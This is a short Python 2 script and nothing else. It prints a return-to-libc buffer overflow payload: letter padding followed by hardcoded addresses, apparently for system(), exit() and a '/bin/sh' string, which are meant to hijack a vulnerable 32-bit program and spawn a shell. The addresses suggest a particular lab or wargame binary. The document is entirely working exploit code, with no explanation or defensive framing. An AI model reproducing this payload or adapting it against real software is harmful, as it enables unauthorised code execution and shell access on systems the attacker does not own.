import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"
system = struct.pack("I", 0xf7e40950)
paddingPostSystem = "AAAA"
bin_sh = struct.pack("I", 0xf7f5f10b)
paddingPostBin = "AAAA"
exit = struct.pack("I", 0xf7e347c0)
print padding+system+exit+bin_sh
